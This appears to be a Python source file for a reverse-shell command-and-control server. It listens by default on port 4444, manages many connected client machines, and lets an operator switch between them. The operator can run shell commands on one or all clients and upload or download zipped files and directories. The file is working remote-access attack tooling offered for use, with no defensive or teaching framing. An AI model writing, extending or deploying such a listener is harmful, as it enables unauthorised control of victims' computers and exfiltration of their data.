import socket
import threading
import os
import queue
import json
from datetime import datetime
import struct
import zipfile
import io

# server list - list clients
# server switch <ip:port> - switch client
# server broadcast <cmd> - send command to all clients
# server help - show commands

# upload <path> - upload file
# download <path> - download file

class ConnectionManager:
    def __init__(self):
        self.clients = {}  # Dictionary to store client connections
        self.current_client = None  # Currently selected client
        self.lock = threading.Lock()
        self.command_queues = {}  # Command queues for each client

    def add_client(self, client_socket, address, cwd):
        with self.lock:
            client_id = f"{address[0]}:{address[1]}"
            self.clients[client_id] = {
                'socket': client_socket,
                'address': address,
                'cwd': cwd,
                'connected_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                'hostname': ''
            }
            self.command_queues[client_id] = queue.Queue()
            if not self.current_client:
                self.current_client = client_id
            return client_id

    def remove_client(self, client_id):
        with self.lock:
            if client_id in self.clients:
                try:
                    self.clients[client_id]['socket'].close()
                except:
                    pass
                del self.clients[client_id]
                del self.command_queues[client_id]
                if self.current_client == client_id:
                    self.current_client = next(iter(self.clients)) if self.clients else None

    def get_client_count(self):
        return len(self.clients)

    def list_clients(self):
        with self.lock:
            return [
                f"{cid} - {data['connected_time']} - CWD: {data['cwd']}"
                for cid, data in self.clients.items()
            ]

    def switch_client(self, client_id):
        with self.lock:
            if client_id in self.clients:
                self.current_client = client_id
                return True
            return False

    def get_current_client(self):
        return self.current_client

    def get_client_socket(self, client_id):
        return self.clients.get(client_id, {}).get('socket')

    def get_client_cwd(self, client_id):
        return self.clients.get(client_id, {}).get('cwd')

    def update_client_cwd(self, client_id, new_cwd):
        with self.lock:
            if client_id in self.clients:
                self.clients[client_id]['cwd'] = new_cwd

def send_message(sock, message):
    """Send a length-prefixed message"""
    try:
        message_len = len(message)
        sock.send(struct.pack('!Q', message_len))
        
        total_sent = 0
        while total_sent < message_len:
            sent = sock.send(message[total_sent:total_sent + BUFFER_SIZE])
            if sent == 0:
                raise RuntimeError("Socket connection broken")
            total_sent += sent
            
    except Exception as e:
        raise RuntimeError(f"Send failed: {str(e)}")

def receive_message(sock):
    """Receive a length-prefixed message"""
    try:
        size_data = sock.recv(8)
        if not size_data:
            return None
        message_len = struct.unpack('!Q', size_data)[0]
        
        chunks = []
        bytes_received = 0
        while bytes_received < message_len:
            chunk = sock.recv(min(message_len - bytes_received, BUFFER_SIZE))
            if not chunk:
                return None
            chunks.append(chunk)
            bytes_received += len(chunk)
            
        return b''.join(chunks)
        
    except Exception as e:
        raise RuntimeError(f"Receive failed: {str(e)}")

def create_zip_file(path):
    """Create a zip file containing a directory"""
    temp_zip = io.BytesIO()
    with zipfile.ZipFile(temp_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
        if os.path.isfile(path):
            zipf.write(path, os.path.basename(path))
        else:
            for root, _, files in os.walk(path):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, os.path.dirname(path))
                    zipf.write(file_path, arcname)
    return temp_zip.getvalue()

def extract_zip_file(zip_data, extract_path):
    """Extract a zip file to the specified path"""
    with io.BytesIO(zip_data) as zip_buffer:
        with zipfile.ZipFile(zip_buffer) as zip_file:
            zip_file.extractall(extract_path)

def handle_file_transfer(sock, path, mode='upload'):
    try:
        if mode == 'upload':
            if not os.path.exists(path):
                print(f"Path {path} does not exist")
                return False
                
            print(f"Zipping {path}...")
            zip_data = create_zip_file(path)
            
            print("Sending data...")
            send_message(sock, zip_data)
            print("Data sent successfully")
            return True
            
        else:  # download
            print(f"Receiving data for {path}...")
            data = receive_message(sock)
            if not data:
                print("No data received")
                return False
                
            parent_dir = os.path.dirname(path)
            if parent_dir:
                os.makedirs(parent_dir, exist_ok=True)
                
            try:
                extract_zip_file(data, os.path.dirname(path) if os.path.dirname(path) else '.')
                print(f"Successfully extracted to {path}")
            except zipfile.BadZipFile:
                with open(path, 'wb') as f:
                    f.write(data)
                print(f"Successfully saved file {path}")
                
            return True
            
    except Exception as e:
        print(f"Transfer failed: {str(e)}")
        return False

def handle_client_connection(client_socket, client_address, manager):
    try:
        cwd = receive_message(client_socket).decode()
        client_id = manager.add_client(client_socket, client_address, cwd)
        print(f"\nNew client connected: {client_id}")
        
        while True:
            try:
                command_queue = manager.command_queues[client_id]
                command = command_queue.get()
                
                if command.lower() == "exit":
                    break
                
                send_message(client_socket, command.encode())
                
                split_command = command.split()
                command_type = split_command[0].lower() if split_command else ""
                
                if command_type in ("upload", "download"):
                    if len(split_command) < 2:
                        print("Missing file path")
                        continue
                        
                    success = handle_file_transfer(
                        client_socket,
                        split_command[1],
                        command_type
                    )
                    
                    if not success:
                        continue
                
                response = receive_message(client_socket)
                if response:
                    output, new_cwd = response.decode().split("<sep>")
                    manager.update_client_cwd(client_id, new_cwd)
                    print(output if output else "Command executed successfully")
                
            except Exception as e:
                print(f"Error with client {client_id}: {e}")
                break
                
    except Exception as e:
        print(f"Client {client_address} disconnected: {e}")
    finally:
        manager.remove_client(client_id)
        print(f"\nClient {client_id} disconnected")

def handle_server_commands(manager):
    while True:
        try:
            current_client = manager.get_current_client()
            if not current_client:
                cmd = input("No clients connected. Press Enter to refresh...\n")
                continue
                
            client_cwd = manager.get_client_cwd(current_client)
            command = input(f"[{current_client}] {client_cwd} $> ").strip()
            
            if not command:
                continue
                
            if command.startswith("server"):
                handle_server_command(command, manager)
                continue
            
            manager.command_queues[current_client].put(command)
            
        except Exception as e:
            print(f"Server command error: {e}")

def handle_server_command(command, manager):
    parts = command.split()
    cmd = parts[1] if len(parts) > 1 else "help"
    
    if cmd == "list":
        clients = manager.list_clients()
        print("\nConnected clients:")
        for client in clients:
            print(client)
            
    elif cmd == "switch":
        if len(parts) < 3:
            print("Usage: server switch <client_id>")
            return
            
        client_id = parts[2]
        if manager.switch_client(client_id):
            print(f"Switched to client: {client_id}")
        else:
            print(f"Client {client_id} not found")
            
    elif cmd == "broadcast":
        message = " ".join(parts[2:])
        for client_id in manager.clients:
            manager.command_queues[client_id].put(message)
            print(f"Message sent to {client_id}")
            
    elif cmd == "help":
        print("""
Server Commands:
    server list - List all connected clients
    server switch <client_id> - Switch to a specific client
    server broadcast <command> - Send command to all clients
    server help - Show this help message
        """)
    else:
        print("Unknown server command. Use 'server help' for available commands")

def get_local_ips():
    """Get all local IP addresses"""
    ip_list = []
    
    try:
        # Get hostname first
        hostname = socket.gethostname()
        
        # Get all IPs from hostname
        ip_list.append(socket.gethostbyname(hostname))
        
        # Try to get additional IPs
        try:
            for info in socket.getaddrinfo(hostname, None):
                if info[0] == socket.AF_INET:  # Only IPv4
                    ip = info[4][0]
                    if ip not in ip_list:
                        ip_list.append(ip)
        except:
            pass
            
    except:
        pass
        
    # Add loopback if nothing else found
    if not ip_list:
        ip_list.append('127.0.0.1')
        
    # Always ensure 0.0.0.0 is an option
    ip_list.append('0.0.0.0')
    
    return list(set(ip_list))  # Remove duplicates

BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"

def main():
    # Setup server socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    # Get available IP addresses
    available_ips = get_local_ips()
    
    print("\nAvailable network interfaces:")
    for idx, ip in enumerate(available_ips):
        print(f"{idx}: {ip}")
    
    # Let user choose interface
    while True:
        selection = input("\nEnter IP number to bind to (or press enter for all interfaces): ").strip()
        
        if not selection:  # Default to all interfaces
            host = "0.0.0.0"
            break
            
        try:
            idx = int(selection)
            if 0 <= idx < len(available_ips):
                host = available_ips[idx]
                break
            else:
                print("Invalid selection number")
        except ValueError:
            print("Please enter a valid number")
    
    # Get port number
    while True:
        port_input = input("Enter port number (default: 4444): ").strip()
        if not port_input:
            port = 4444
            break
        try:
            port = int(port_input)
            if 1 <= port <= 65535:
                break
            else:
                print("Port must be between 1 and 65535")
        except ValueError:
            print("Please enter a valid port number")
    
    try:
        server_socket.bind((host, port))
        server_socket.listen(5)
        print(f"\nServer listening on {host}:{port}")
        print("\nServer commands available (type 'server help' for list)")
        
        connection_manager = ConnectionManager()
        
        # Start command handler thread
        command_thread = threading.Thread(target=handle_server_commands, args=(connection_manager,))
        command_thread.daemon = True
        command_thread.start()
        
        # Main loop accepting new connections
        while True:
            try:
                client_socket, client_address = server_socket.accept()
                print(f"\nIncoming connection from {client_address[0]}:{client_address[1]}")
                client_thread = threading.Thread(
                    target=handle_client_connection,
                    args=(client_socket, client_address, connection_manager)
                )
                client_thread.daemon = True
                client_thread.start()
            except Exception as e:
                print(f"Error accepting connection: {e}")
                
    except Exception as e:
        print(f"\nError starting server: {e}")
        if "Address already in use" in str(e):
            print(f"Port {port} is already in use. Try a different port.")
        elif "Cannot assign requested address" in str(e):
            print(f"Cannot bind to {host}. Try a different interface or use 0.0.0.0")
    
    finally:
        server_socket.close()

if __name__ == "__main__":
    main()